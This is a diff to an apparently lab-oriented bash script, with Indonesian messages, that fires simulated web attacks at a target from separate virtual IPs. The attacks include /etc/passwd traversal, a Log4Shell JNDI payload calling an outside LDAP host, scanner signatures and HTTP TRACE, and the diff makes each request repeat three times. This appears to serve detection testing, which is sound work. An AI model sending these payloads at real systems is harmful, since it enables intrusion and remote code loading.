@@ -89,38 +89,44 @@ do_4_xmasscan() {
 
 do_5_lfi() {
     header "5️⃣  Local File Inclusion (/etc/passwd) - IP: .105"
-    atk "Membaca file sistem sensitif via URL..."
-    curl --interface ${VIRT_IP5} "http://${TARGET}/vulnerabilities/fi/?page=../../../../../../../../etc/passwd"
+    atk "Membaca file sistem sensitif via URL (dikirim 3x)..."
+    for i in {1..3}; do curl -s -o /dev/null --interface ${VIRT_IP5} "http://${TARGET}/vulnerabilities/fi/?page=../../../../../../../../etc/passwd"; done
+    echo -e "${GREEN}[+] Selesai dikirim 3x!${NC}"
 }
 
 do_6_morfeus() {
     header "6️⃣  Morfeus Web Scanner (muieblackcat) - IP: .106"
-    atk "Memalsukan signature scanner Morfeus lawas..."
-    curl --interface ${VIRT_IP6} "http://${TARGET}/muieblackcat"
+    atk "Memalsukan signature scanner Morfeus lawas (dikirim 3x)..."
+    for i in {1..3}; do curl -s -o /dev/null --interface ${VIRT_IP6} "http://${TARGET}/muieblackcat"; done
+    echo -e "${GREEN}[+] Selesai dikirim 3x!${NC}"
 }
 
 do_7_phpeasteregg() {
     header "7️⃣  PHP Easter Egg Info Disclosure - IP: .107"
-    atk "Mengakses halaman rahasia PHP..."
-    curl --interface ${VIRT_IP7} "http://${TARGET}/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42"
+    atk "Mengakses halaman rahasia PHP (dikirim 3x)..."
+    for i in {1..3}; do curl -s -o /dev/null --interface ${VIRT_IP7} "http://${TARGET}/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42"; done
+    echo -e "${GREEN}[+] Selesai dikirim 3x!${NC}"
 }
 
 do_8_gobuster() {
     header "8️⃣  Web Directory Scanner (Gobuster) - IP: .108"
-    atk "Memalsukan User-Agent Gobuster..."
-    curl --interface ${VIRT_IP8} -H "User-Agent: gobuster/3.1.0" "http://${TARGET}/admin/"
+    atk "Memalsukan User-Agent Gobuster (dikirim 3x)..."
+    for i in {1..3}; do curl -s -o /dev/null --interface ${VIRT_IP8} -H "User-Agent: gobuster/3.1.0" "http://${TARGET}/admin/"; done
+    echo -e "${GREEN}[+] Selesai dikirim 3x!${NC}"
 }
 
 do_9_log4shell() {
     header "9️⃣  Log4Shell (CVE-2021-44228) - IP: .109"
-    atk "Eksploitasi Java Log4j via injeksi JNDI..."
-    curl --interface ${VIRT_IP9} -H 'User-Agent: ${jndi:ldap://192.168.216.120:1389/Exploit}' "http://${TARGET}/"
+    atk "Eksploitasi Java Log4j via injeksi JNDI (dikirim 3x)..."
+    for i in {1..3}; do curl -s -o /dev/null --interface ${VIRT_IP9} -H 'User-Agent: ${jndi:ldap://192.168.216.120:1389/Exploit}' "http://${TARGET}/"; done
+    echo -e "${GREEN}[+] Selesai dikirim 3x!${NC}"
 }
 
 do_10_httptrace() {
     header "🔟  HTTP TRACE Method (XST) - IP: .110"
-    atk "Mengirim metode HTTP TRACE terlarang..."
-    curl --interface ${VIRT_IP10} -X TRACE "http://${TARGET}/"
+    atk "Mengirim metode HTTP TRACE terlarang (dikirim 3x)..."
+    for i in {1..3}; do curl -s -o /dev/null --interface ${VIRT_IP10} -X TRACE "http://${TARGET}/"; done
+    echo -e "${GREEN}[+] Selesai dikirim 3x!${NC}"
 }
 
 do_all() {
